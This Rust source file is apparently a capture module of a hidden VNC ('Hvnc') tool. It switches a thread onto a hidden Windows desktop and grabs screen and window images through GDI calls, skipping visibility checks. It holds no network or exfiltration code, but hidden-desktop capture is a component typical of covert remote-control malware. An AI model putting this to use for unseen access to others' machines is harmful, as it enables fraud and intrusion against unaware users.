//! Additional capture functions for hidden desktop support

use crate::{HvncError, Result};
use crate::host::WindowHandle;
use crate::common::Frame;
use std::mem;
use std::ptr;
use winapi::shared::windef::{RECT, HBITMAP, HWND};
use winapi::um::wingdi::{
    CreateCompatibleDC, CreateCompatibleBitmap, SelectObject, BitBlt, GetDIBits,
    DeleteObject, DeleteDC, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY
};
use winapi::um::winuser::{
    GetWindowRect, GetDC, ReleaseDC, IsIconic, GetThreadDesktop, SetThreadDesktop,
    InvalidateRect, UpdateWindow, GetDCEx, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN
};
use winapi::um::processthreadsapi::GetCurrentThreadId;
use winapi::um::errhandlingapi::GetLastError;
use log::{info, warn, debug};

/// Try alternative capture method for hidden desktop
fn try_capture_hidden_desktop_alternative(desktop: crate::host::DesktopHandle) -> Result<Frame> {
    // Switch to hidden desktop and enumerate windows to find the desktop window
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    
    if switch_result == 0 {
        return Err(HvncError::windows_api("Failed to switch to hidden desktop"));
    }
    
    // Try to capture the hidden desktop content
    let capture_result = try_capture_hidden_desktop_content();
    
    // Always restore original desktop
    let restore_result = unsafe { SetThreadDesktop(original_desktop) };
    if restore_result == 0 {
        warn!("Warning: Failed to restore original desktop");
    }
    
    capture_result
}

/// Capture hidden desktop content using the workstation desktop approach
fn try_capture_hidden_desktop_content() -> Result<Frame> {
    // Find all windows in the current desktop (hidden desktop after switch)
    let mut windows = Vec::new();
    let windows_ptr = &mut windows as *mut Vec<HWND>;
    
    // Enumerate all windows in the current desktop
    let enum_result = unsafe {
        winapi::um::winuser::EnumWindows(Some(enum_hidden_desktop_windows), windows_ptr as isize)
    };
    
    if enum_result == 0 {
        warn!("Failed to enumerate windows in hidden desktop");
    }
    
    // Try to find a suitable window to capture or use desktop window
    if windows.is_empty() {
        // No windows found, try to capture the desktop surface directly
        try_capture_desktop_surface()
    } else {
        // Found windows, try to capture the largest one or use desktop approach
        info!("Found {} windows in hidden desktop, attempting surface capture", windows.len());
        try_capture_desktop_surface()
    }
}

/// Enumerate windows callback for hidden desktop
unsafe extern "system" fn enum_hidden_desktop_windows(hwnd: HWND, lparam: isize) -> i32 {
    let windows = &mut *(lparam as *mut Vec<HWND>);
    
    // Check if this is a top-level window
    if winapi::um::winuser::GetParent(hwnd).is_null() {
        // Get window class name to filter out system windows
        let mut class_name = [0u16; 256];
        let len = winapi::um::winuser::GetClassNameW(hwnd, class_name.as_mut_ptr(), class_name.len() as i32);
        
        if len > 0 {
            let class_str = String::from_utf16_lossy(&class_name[..len as usize]);
            // Skip shell and system windows
            if !class_str.starts_with("Shell_") && !class_str.starts_with("#32769") {
                windows.push(hwnd);
            }
        }
    }
    
    1 // Continue enumeration
}

/// Capture the desktop surface using a different approach
fn try_capture_desktop_surface() -> Result<Frame> {
    // Try to get screen metrics for the hidden desktop
    let width = unsafe { GetSystemMetrics(SM_CXSCREEN) } as u32;
    let height = unsafe { GetSystemMetrics(SM_CYSCREEN) } as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid desktop surface dimensions"));
    }
    
    info!("Capturing hidden desktop surface: {}x{}", width, height);
    
    // Create a surface capture using CreateDC instead of GetDC
    let display_dc = unsafe { 
        winapi::um::wingdi::CreateDCA(
            b"DISPLAY\0".as_ptr() as *const i8,
            ptr::null(),
            ptr::null(),
            ptr::null()
        )
    };
    
    if display_dc.is_null() {
        return Err(HvncError::windows_api("Failed to create display device context"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(display_dc) };
    if mem_dc.is_null() {
        unsafe { winapi::um::wingdi::DeleteDC(display_dc) };
        return Err(HvncError::windows_api("Failed to create compatible device context"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(display_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe {
            DeleteDC(mem_dc);
            winapi::um::wingdi::DeleteDC(display_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    let blt_success = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            display_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_success == 0 {
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            winapi::um::wingdi::DeleteDC(display_dc);
        }
        return Err(HvncError::windows_api("Failed to copy hidden desktop surface"));
    }
    
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                winapi::um::wingdi::DeleteDC(display_dc);
            }
            return Err(e);
        }
    };
    
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        winapi::um::wingdi::DeleteDC(display_dc);
    }
    
    info!("Hidden desktop surface capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Capture desktop with specific desktop context (for hidden desktop scenarios)
pub fn capture_desktop_with_context(desktop: crate::host::DesktopHandle) -> Result<Frame> {
    info!("Attempting desktop capture with context switching");
    
    // Try multiple fallback approaches for desktop capture
    
    // Approach 1: Desktop switching with capture
    match try_capture_with_desktop_switch(desktop) {
        Ok(frame) => return Ok(frame),
        Err(e) => warn!("Desktop switch capture failed: {}", e),
    }
    
    // Approach 2: Direct desktop device context
    match try_capture_with_desktop_dc(desktop) {
        Ok(frame) => return Ok(frame),
        Err(e) => warn!("Desktop DC capture failed: {}", e),
    }
    
    // Approach 3: Fallback - try to capture with different method but still within hidden desktop context
    warn!("All desktop context captures failed, trying alternative hidden desktop capture");
    try_capture_hidden_desktop_alternative(desktop)
}

/// Capture a window with desktop switching for hidden desktop windows
pub fn capture_window_with_desktop_switch(window: WindowHandle, target_desktop: Option<crate::host::DesktopHandle>) -> Result<Frame> {
    let desktop = match target_desktop {
        Some(d) => d,
        None => {
            warn!("No target desktop provided, using normal window capture");
            return super::capture::capture_window(window);
        }
    };
    
    info!("Attempting window capture with desktop switch for hidden desktop");
    
    // Store the original desktop to restore later
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    
    if original_desktop.is_null() {
        return Err(HvncError::windows_api(
            "Failed to get current thread desktop"
        ));
    }
    
    // Switch to the target desktop temporarily
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    
    if switch_result == 0 {
        warn!("Failed to switch to target desktop, trying fallback approaches");
        // Don't return error immediately, try other approaches
    }
    
    // Force window to render in the hidden desktop context if switch succeeded
    if switch_result != 0 {
        let _ = force_window_render_safe(window);
    }
    
    // Perform the window capture while in the target desktop context
    let capture_result = capture_window_internal(window);
    
    // Always restore the original desktop, regardless of capture success/failure
    let restore_result = unsafe { SetThreadDesktop(original_desktop) };
    if restore_result == 0 {
        debug!("Warning: Failed to restore original desktop");
    }
    
    match capture_result {
        Ok(frame) => {
            info!("Window capture with desktop switch successful");
            Ok(frame)
        }
        Err(e) => {
            warn!("Window capture with desktop switch failed: {}", e);
            Err(e)
        }
    }
}

/// Internal window capture without desktop checks (for use with desktop switching)
fn capture_window_internal(window: WindowHandle) -> Result<Frame> {
    // Validate window handle
    if window.is_null() {
        return Err(HvncError::window_not_found("Window handle is null"));
    }
    
    // Skip visibility check for hidden desktop compatibility
    // Only check if window is minimized
    unsafe {
        if IsIconic(window) != 0 {
            return Err(HvncError::window_not_found("Window is minimized"));
        }
    }
    
    // Get window rectangle
    let mut window_rect: RECT = unsafe { mem::zeroed() };
    let success = unsafe { GetWindowRect(window, &mut window_rect) };
    
    if success == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api_with_code(
            "Failed to get window rectangle", error_code
        ));
    }
    
    // Calculate window dimensions
    let width = (window_rect.right - window_rect.left) as u32;
    let height = (window_rect.bottom - window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::window_not_found("Window has zero dimensions"));
    }
    
    info!("Capturing window: {}x{}", width, height);
    
    // Get window device context
    let window_dc = unsafe { GetDC(window) };
    if window_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get window device context"));
    }
    
    // Create compatible device context and bitmap
    let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(window, window_dc) };
        return Err(HvncError::windows_api("Failed to create compatible device context"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe {
            DeleteDC(mem_dc);
            ReleaseDC(window, window_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    // Select bitmap into memory device context
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Copy window content to bitmap
    let blt_success = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            window_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_success == 0 {
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(window, window_dc);
        }
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api_with_code(
            "Failed to copy window content", error_code
        ));
    }
    
    // Convert bitmap to RGB buffer
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(window, window_dc);
            }
            return Err(e);
        }
    };
    
    // Clean up resources
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(window, window_dc);
    }
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Convert a Windows bitmap to RGB buffer (reused from main capture module)
fn bitmap_to_rgb_buffer(bitmap: HBITMAP, width: u32, height: u32) -> Result<Vec<u8>> {
    // Create bitmap info structure
    let mut bitmap_info: BITMAPINFO = unsafe { mem::zeroed() };
    bitmap_info.bmiHeader.biSize = mem::size_of::<BITMAPINFOHEADER>() as u32;
    bitmap_info.bmiHeader.biWidth = width as i32;
    bitmap_info.bmiHeader.biHeight = -(height as i32); // Negative for top-down bitmap
    bitmap_info.bmiHeader.biPlanes = 1;
    bitmap_info.bmiHeader.biBitCount = 24; // 24-bit RGB
    bitmap_info.bmiHeader.biCompression = BI_RGB;
    
    // Calculate buffer size (3 bytes per pixel for RGB, with padding)
    let bytes_per_line = ((width * 3 + 3) / 4) * 4; // DWORD aligned
    let buffer_size = (bytes_per_line * height) as usize;
    let mut buffer = vec![0u8; buffer_size];
    
    // Get device context for GetDIBits
    let screen_dc = unsafe { GetDC(ptr::null_mut()) };
    if screen_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get screen device context"));
    }
    
    // Get bitmap bits
    let lines_copied = unsafe {
        GetDIBits(
            screen_dc,
            bitmap,
            0,
            height,
            buffer.as_mut_ptr() as *mut _,
            &mut bitmap_info,
            DIB_RGB_COLORS,
        )
    };
    
    unsafe { ReleaseDC(ptr::null_mut(), screen_dc) };
    
    if lines_copied == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api_with_code(
            "Failed to get bitmap bits", error_code
        ));
    }
    
    // Convert BGR to RGB and remove padding
    let mut rgb_buffer = Vec::with_capacity((width * height * 3) as usize);
    
    for y in 0..height {
        let line_start = (y * bytes_per_line) as usize;
        for x in 0..width {
            let pixel_start = line_start + (x * 3) as usize;
            
            // Windows bitmap is BGR, we need RGB
            let b = buffer[pixel_start];
            let g = buffer[pixel_start + 1];
            let r = buffer[pixel_start + 2];
            
            rgb_buffer.push(r);
            rgb_buffer.push(g);
            rgb_buffer.push(b);
        }
    }
    
    // Debug: Log buffer size information
    info!("Bitmap conversion: {}x{}, input buffer: {} bytes, output RGB buffer: {} bytes", 
          width, height, buffer.len(), rgb_buffer.len());
    
    Ok(rgb_buffer)
}

/// Force window to render safely (if possible)
fn force_window_render_safe(window: WindowHandle) -> Result<()> {
    // This is a best-effort function to force rendering
    // We can try to send a paint message or invalidate the window
    unsafe {
        // Invalidate the entire window to force a repaint
        InvalidateRect(window, ptr::null(), 1);
        
        // Request an immediate update
        UpdateWindow(window);
    }
    
    Ok(())
}

/// Try desktop capture with desktop switching
fn try_capture_with_desktop_switch(desktop: crate::host::DesktopHandle) -> Result<Frame> {
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    // Switch to target desktop
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        return Err(HvncError::windows_api("Failed to switch to target desktop"));
    }
    
    // Capture current desktop (which is now the target desktop)
    let capture_result = capture_current_desktop();
    
    // Restore original desktop
    let _ = unsafe { SetThreadDesktop(original_desktop) };
    
    capture_result
}

/// Try desktop capture with direct device context
fn try_capture_with_desktop_dc(desktop: crate::host::DesktopHandle) -> Result<Frame> {
    // This approach tries to get the device context directly from the desktop
    // This is more complex and may not work reliably
    let dc = unsafe { GetDCEx(ptr::null_mut(), ptr::null_mut(), 0) };
    if dc.is_null() {
        return Err(HvncError::windows_api("Failed to get desktop device context"));
    }
    
    // Get screen dimensions
    let width = unsafe { GetSystemMetrics(SM_CXSCREEN) } as u32;
    let height = unsafe { GetSystemMetrics(SM_CYSCREEN) } as u32;
    
    if width == 0 || height == 0 {
        unsafe { ReleaseDC(ptr::null_mut(), dc) };
        return Err(HvncError::windows_api("Invalid screen dimensions"));
    }
    
    // Create compatible device context and bitmap
    let mem_dc = unsafe { CreateCompatibleDC(dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(ptr::null_mut(), dc) };
        return Err(HvncError::windows_api("Failed to create compatible device context"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe {
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Copy desktop content
    let blt_success = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_success == 0 {
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), dc);
        }
        return Err(HvncError::windows_api("Failed to copy desktop content"));
    }
    
    // Convert bitmap to RGB buffer
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(ptr::null_mut(), dc);
            }
            return Err(e);
        }
    };
    
    // Clean up
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(ptr::null_mut(), dc);
    }
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}


fn capture_current_desktop() -> Result<Frame> {
    let width = unsafe { GetSystemMetrics(SM_CXSCREEN) } as u32;
    let height = unsafe { GetSystemMetrics(SM_CYSCREEN) } as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid screen dimensions"));
    }
    
    let screen_dc = unsafe { GetDC(ptr::null_mut()) };
    if screen_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get screen device context"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(screen_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(ptr::null_mut(), screen_dc) };
        return Err(HvncError::windows_api("Failed to create compatible device context"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(screen_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe {
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    let blt_success = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            screen_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_success == 0 {
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
        }
        return Err(HvncError::windows_api("Failed to copy screen content"));
    }
    
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(ptr::null_mut(), screen_dc);
            }
            return Err(e);
        }
    };
    
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(ptr::null_mut(), screen_dc);
    }
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}